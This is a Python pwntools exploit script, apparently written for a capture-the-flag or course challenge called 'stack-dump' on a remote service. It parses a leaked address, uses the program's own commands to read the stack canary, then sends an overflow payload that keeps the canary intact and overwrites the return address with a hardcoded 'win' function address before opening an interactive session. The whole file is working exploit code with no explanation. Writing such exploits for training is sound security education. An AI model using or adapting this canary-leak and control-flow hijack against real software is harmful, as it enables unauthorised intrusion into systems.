from pwn import *


def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    prompt = p.recvuntil(b'[q]uit').decode('utf-8')
    address_match = re.search(r'0x[0-9a-fA-F]+', prompt)
    if address_match:
        address = int(address_match.group(0), 16)  # Convert address to integer
        print("address:", hex(address))

        canary_address = address + 65
        print("Modified address (address + 65):", hex(canary_address))

        little_endian_address = struct.pack("<Q", canary_address)  # Use "<Q" for little-endian 64-bit integer
        print("Little-endian format:", little_endian_address.hex())  # Print in hex format for clarity

        # Send the "i" command to the process
        p.sendline(b"i")
        p.recvuntil(b'len:')
        p.sendline(little_endian_address)

        p.sendline(b"\nd")
        p.recvuntil(b': ').decode('utf-8')
        stack_canary = p.recv(8)
        # stack_canary = stack_canary[::-1]
        print("canary:", stack_canary, len(stack_canary))
        #
        p.sendline(b"\n\ni")
        p.recvuntil(b'len:')
        address = 0x4012f6 # win addr
        win_addr = p64(address)
        payload = b"A" * 56 + stack_canary + b"A" * 24 + win_addr
        p.sendline(payload)
        print("payload: ", payload)

        p.recvline().decode('utf-8')
        p.recvline().decode('utf-8')
        p.sendline(b"\n\n\nq")


    p.interactive()


# Example usage
interact_with_process('', '6447.lol', 7139)
# interact_with_process('../w2/stack-dump')
